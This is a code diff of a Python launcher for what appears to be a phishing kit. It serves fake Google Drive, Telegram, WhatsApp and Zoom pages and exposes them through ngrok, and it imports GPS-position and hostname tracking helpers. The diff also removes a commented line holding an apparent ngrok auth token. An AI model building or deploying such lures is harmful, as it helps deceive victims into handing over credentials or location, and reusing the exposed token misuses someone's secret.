@@ -6,22 +6,20 @@ from datetime import date
 import subprocess
 from python.track import open_result_file, get_gps_position, get_hostname
 
-TEMPLATE    = "views"
-DRIVE       = f'{TEMPLATE}/google_drive'
-GIFT        = f'{TEMPLATE}/'
-TOMBOLA     = f'{TEMPLATE}/'
-TELEGRAM    = f'{TEMPLATE}/telegram'
-WHATSAPP    = f'{TEMPLATE}/whatsapp/'
-ZOOM        = f'{TEMPLATE}/zoom'
-PORT        = 8000
-CONFIG_FILE = f'conf.json'
-LOG_FILE    = f'logs/{date.today()}.log'
-NGROK_LOG   = f'logs/ngrok_{date.today()}.log'
-IP          = f'127.0.0.1:{PORT}'
+TEMPLATE         = "views"
+DRIVE            = f'{TEMPLATE}/google_drive'
+TELEGRAM         = f'{TEMPLATE}/telegram'
+WHATSAPP         = f'{TEMPLATE}/whatsapp/'
+ZOOM             = f'{TEMPLATE}/zoom'
+PORT             = 8000
+CONFIG_FILE      = f'conf.json'
+LOG_FILE         = f'logs/{date.today()}.log'
+NGROK_LOG        = f'logs/ngrok_{date.today()}.log'
+IP               = f'127.0.0.1:{PORT}'
+VERSION          = '1.0.0'
+NGROK_SERVER_URL = 'C:\\Users\\UserName\\Documents\\tools\\ngrok.exe'
 global proccesss
-proccesss = []
-VERSION = '1.0.0'
-NGROK_SERVER_URL = 'C:\\Users\\Kassoum\\Documents\\tools\\ngrok.exe'
+proccesss        = []
 
 def killProcess(proccesss):
     for item in proccesss:
@@ -35,7 +33,6 @@ def clean_screen():
 
 def start_ngrok_server():
     command = f'start {NGROK_SERVER_URL} http {PORT}'
-    # command = f'{NGROK_SERVER_URL} config add-authtoken 2C4QRfq1f59Pwi734Iqd1jFAOZS_4EQgMEPNzcWPxUbQsUYKb'
     system(command)
 
 def start_local_server(template, ngrok_serve=1):
@@ -135,8 +132,6 @@ def choose_server(template):
     
     if template =='d':
         drive(choice)
-    if template =='g':
-        return 'g'
     if template =='t':
         telegran(choice)
     if template =='w':
@@ -152,29 +147,30 @@ if __name__ == '__main__':
     |  _|  | || | | || (_| | | |  | || |___
     |_|    |_||_| |_| \__,_| |_|  |_||_____|
     """
-    try:
-        parser = argparse.ArgumentParser()
-        parser.add_argument('-d', '--drive', help='Google drive', action='store_true')
-        parser.add_argument('-g', '--gift', help='Gift', action='store_true')
-        parser.add_argument('-t', '--telegran', help='Telegram', action='store_true')
-        parser.add_argument('-w', '--whatsapp', help='Whatsapp', action='store_true')
-        parser.add_argument('-z', '--zoom', help='Whatsapp', action='store_true')
-        args = parser.parse_args()
-        
-        clean_screen()
-        print(banner)
-        if args.drive:
-            choose_server('d')
-        elif args.gift:
-            choose_server('g')
-        elif args.telegran:
-            choose_server('t')
-        elif args.whatsapp:
-            choose_server('w')
-        elif args.zoom:
-            choose_server('z')
-        if args.drive is False and args.gift is False and args.telegran is False and args.whatsapp is False and args.zoom is False:
-            parser.print_help()   
-    except KeyboardInterrupt as e:
-        print(f'User interruption........')
-        killProcess(proccesss)
+    if name == 'nt':
+        try:
+            parser = argparse.ArgumentParser()
+            parser.add_argument('-d', '--drive', help='Google drive', action='store_true')
+            parser.add_argument('-t', '--telegran', help='Telegram', action='store_true')
+            parser.add_argument('-w', '--whatsapp', help='Whatsapp', action='store_true')
+            parser.add_argument('-z', '--zoom', help='Whatsapp', action='store_true')
+            args = parser.parse_args()
+            
+            clean_screen()
+            print(banner)
+            if args.drive:
+                choose_server('d')
+            elif args.telegran:
+                choose_server('t')
+            elif args.whatsapp:
+                choose_server('w')
+            elif args.zoom:
+                choose_server('z')
+            if args.drive is False and args.telegran is False and args.whatsapp is False and args.zoom is False:
+                parser.print_help()   
+        except KeyboardInterrupt as e:
+            print(f'User interruption........')
+            killProcess(proccesss)
+    else:
+        print(f'This version ({VERSION}) is only available for Windows platform')
+        exit(0)
